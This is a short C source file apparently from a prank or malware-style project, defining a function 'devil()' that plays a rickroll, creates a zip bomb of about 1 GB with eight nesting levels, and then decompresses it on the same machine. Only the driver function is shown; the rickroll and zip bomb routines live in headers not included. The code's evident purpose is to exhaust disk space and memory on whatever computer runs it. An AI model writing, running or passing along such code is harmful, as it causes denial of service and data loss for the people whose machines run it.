//
// Created by ewan decima on 11/16/25.
// Compatible GCC 4.4.7
//
#include "DevilCode.h"
#include "Rickroll.h"
#include "zipbomb.h"

void devil() {
    // 1. Rickroll
    roll(100);
    
    // 2. Creation de la zipbomb
    const char* filename = "devil_zipbomb.bin";
    create_zipbomb(filename, 1024, 8);  // 1 GB, 8 niveaux
    
    // 3. Decompression de la zipbomb
    detonate_zipbomb(filename, 8, 1024);
}
